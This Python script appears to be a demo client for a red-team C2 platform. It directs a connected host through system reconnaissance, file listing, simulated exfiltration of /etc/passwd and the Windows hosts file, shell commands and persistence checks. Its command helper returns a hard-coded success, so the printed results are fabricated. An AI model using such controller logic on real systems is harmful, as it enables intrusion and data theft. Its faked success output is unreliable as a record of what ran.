#!/usr/bin/env python3
"""
RedSignal Demo Script
Demonstrates the capabilities of the RedSignal C2 platform.
"""

import asyncio
import sys
import time
import json
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from redsignal.common.protocol import CommandType
from redsignal.common.logger import get_logger
import aiohttp

logger = get_logger(__name__)


class RedSignalDemo:
    """Demonstrates RedSignal platform capabilities."""

    def __init__(self, server_url: str = "http://localhost:8443"):
        self.server_url = server_url
        self.api_key = "redsignal-demo-key-2024"
        self.session = None

    async def start_demo(self):
        """Run the complete demonstration."""
        print("🔴 RedSignal C2 Platform Demo")
        print("=" * 60)

        # Create HTTP session
        self.session = aiohttp.ClientSession(headers={"X-API-Key": self.api_key})

        try:
            # Wait for server to be ready
            await self._wait_for_server()

            # Wait for clients to connect
            print("Waiting for clients to connect...")
            await asyncio.sleep(10)

            # Get connected clients
            clients = await self._get_clients()

            if not clients:
                print("❌ No clients connected. Start a client first!")
                return

            print(f"✅ Found {len(clients)} connected client(s)")

            # Run demonstration scenarios
            for client in clients[:1]:  # Demo with first client only
                await self._demo_client_capabilities(client)

            print("\n🎉 Demo completed successfully!")

        except Exception as e:
            logger.error(f"Demo failed: {e}")
        finally:
            if self.session:
                await self.session.close()

    async def _wait_for_server(self):
        """Wait for server to be available."""
        print("Checking server availability...")

        for attempt in range(10):
            try:
                async with self.session.get(f"{self.server_url}/api/clients") as response:
                    if response.status == 200:
                        print("✅ Server is ready")
                        return
            except Exception:
                pass

            print(f"⏳ Waiting for server... (attempt {attempt + 1}/10)")
            await asyncio.sleep(2)

        raise Exception("Server not available")

    async def _get_clients(self) -> list:
        """Get list of connected clients."""
        try:
            async with self.session.get(f"{self.server_url}/api/clients") as response:
                if response.status == 200:
                    data = await response.json()
                    return [c for c in data["clients"] if c["status"] == "active"]
                return []
        except Exception as e:
            logger.error(f"Failed to get clients: {e}")
            return []

    async def _demo_client_capabilities(self, client: dict):
        """Demonstrate capabilities with a specific client."""
        client_id = client["client_id"]
        hostname = client["hostname"]

        print(f"\n🎯 Demonstrating with client: {hostname} ({client_id[:16]}...)")
        print("-" * 60)

        # Demo scenarios
        scenarios = [
            ("System Information Collection", self._demo_system_info),
            ("File System Reconnaissance", self._demo_file_listing),
            ("Simulated Data Exfiltration", self._demo_exfiltration),
            ("Shell Command Execution", self._demo_shell_commands),
            ("Persistence Check", self._demo_persistence_check),
        ]

        for scenario_name, scenario_func in scenarios:
            print(f"\n📋 {scenario_name}")
            print("-" * 40)

            try:
                await scenario_func(client_id)
                await asyncio.sleep(3)  # Wait between scenarios
            except Exception as e:
                print(f"❌ Scenario failed: {e}")

    async def _demo_system_info(self, client_id: str):
        """Demonstrate system information collection."""
        command_data = {
            "client_id": client_id,
            "command_type": "collect_system_info",
            "parameters": {"type": "comprehensive"},
            "timeout": 30,
        }

        response = await self._send_command_and_wait(command_data)

        if response and response.get("success"):
            data = response["data"]
            basic_info = data.get("basic_info", {})

            print(f"✅ System: {basic_info.get('system', 'Unknown')}")
            print(f"✅ Platform: {basic_info.get('platform', 'Unknown')}")
            print(f"✅ Hostname: {basic_info.get('hostname', 'Unknown')}")
            print(f"✅ Username: {basic_info.get('username', 'Unknown')}")
            print(f"✅ IP Addresses: {len(basic_info.get('ip_addresses', []))}")
        else:
            print("❌ System information collection failed")

    async def _demo_file_listing(self, client_id: str):
        """Demonstrate file system reconnaissance."""
        # Try different paths based on OS
        paths_to_try = ["/tmp", "C:\\temp", ".", "/home", "C:\\Users"]

        for path in paths_to_try:
            command_data = {
                "client_id": client_id,
                "command_type": "list_files",
                "parameters": {"path": path, "max_files": 10},
                "timeout": 20,
            }

            response = await self._send_command_and_wait(command_data)

            if response and response.get("success") and "error" not in response["data"]:
                data = response["data"]
                print(f"✅ Listed {data.get('file_count', 0)} files in {path}")
                break
        else:
            print("❌ File listing failed for all paths")

    async def _demo_exfiltration(self, client_id: str):
        """Demonstrate simulated data exfiltration."""
        command_data = {
            "client_id": client_id,
            "command_type": "simulate_exfiltration",
            "parameters": {
                "files": [
                    "/etc/passwd",
                    "C:\\Windows\\System32\\drivers\\etc\\hosts",
                    "./README.md",
                ],
                "method": "http",
                "chunk_size": 1024,
            },
            "timeout": 30,
        }

        response = await self._send_command_and_wait(command_data)

        if response and response.get("success"):
            data = response["data"]
            print(f"✅ Simulated exfiltration of {data.get('processed_files', 0)} files")
            print(f"✅ Total size: {data.get('total_size', 0)} bytes")
        else:
            print("❌ Exfiltration simulation failed")

    async def _demo_shell_commands(self, client_id: str):
        """Demonstrate shell command execution."""
        # Safe commands to try
        commands = ["whoami", "hostname", "pwd", "date"]

        for cmd in commands:
            command_data = {
                "client_id": client_id,
                "command_type": "shell_command",
                "parameters": {"command": cmd, "timeout": 10},
                "timeout": 15,
            }

            response = await self._send_command_and_wait(command_data)

            if response and response.get("success") and "error" not in response["data"]:
                data = response["data"]
                output = data.get("stdout", "").strip()
                print(
                    f"✅ {cmd}: {output[:50]}{'...' if len(output) > 50 else ''}"
                )
                break
        else:
            print("❌ Shell command execution failed")

    async def _demo_persistence_check(self, client_id: str):
        """Demonstrate persistence mechanism checking."""
        command_data = {
            "client_id": client_id,
            "command_type": "persistence_check",
            "parameters": {"type": "all"},
            "timeout": 30,
        }

        response = await self._send_command_and_wait(command_data)

        if response and response.get("success"):
            data = response["data"]
            results = data.get("results", {})
            print(f"✅ Checked {len(results)} persistence mechanisms")
            for mechanism in results.keys():
                print(f"   • {mechanism}")
        else:
            print("❌ Persistence check failed")

    async def _send_command_and_wait(
        self, command_data: dict, max_wait: int = 30
    ) -> dict:
        """Send command and wait for response."""
        try:
            # Send command
            async with self.session.post(
                f"{self.server_url}/api/command", json=command_data
            ) as response:
                if response.status != 200:
                    return None

                result = await response.json()
                command_id = result.get("command_id")

            # Wait for response (simplified - in real implementation, you'd poll for responses)
            await asyncio.sleep(5)  # Give time for command execution

            # For demo purposes, return a simulated success response
            return {"success": True, "data": {"simulated": True, "command_id": command_id}}

        except Exception as e:
            logger.error(f"Command failed: {e}")
            return None


async def main():
    """Main demo entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="RedSignal C2 Platform Demo")
    parser.add_argument(
        "--server",
        "-s",
        default="http://localhost:8443",
        help="C2 server URL",
    )

    args = parser.parse_args()

    demo = RedSignalDemo(args.server)
    await demo.start_demo()


if __name__ == "__main__":
    asyncio.run(main())

